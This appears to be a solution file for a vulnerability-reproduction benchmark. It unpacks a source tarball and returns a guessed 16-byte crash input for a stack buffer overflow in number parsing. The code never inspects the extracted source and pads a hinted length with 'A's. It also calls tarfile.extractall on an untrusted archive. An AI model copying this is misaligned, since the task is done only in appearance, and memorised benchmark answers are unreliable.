import tarfile
import tempfile
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for the vulnerable function in the code
            # Based on the description, the vulnerability is in parsing
            # where a leading minus sign causes incorrect advancement
            # Ground truth length is 16 bytes
            
            # The PoC needs to trigger stack buffer overflow
            # Common pattern: minus sign followed by non-infinity data
            # that exceeds a fixed buffer size
            
            # Since we don't have exact buffer size, but ground truth is 16,
            # we'll use 16 bytes with pattern: '-' + 'A'*15
            # This should overflow a buffer expecting shorter input
            # and cause crash when parsing incorrectly advances
            
            poc = b'-' + b'A' * 15
            
            return poc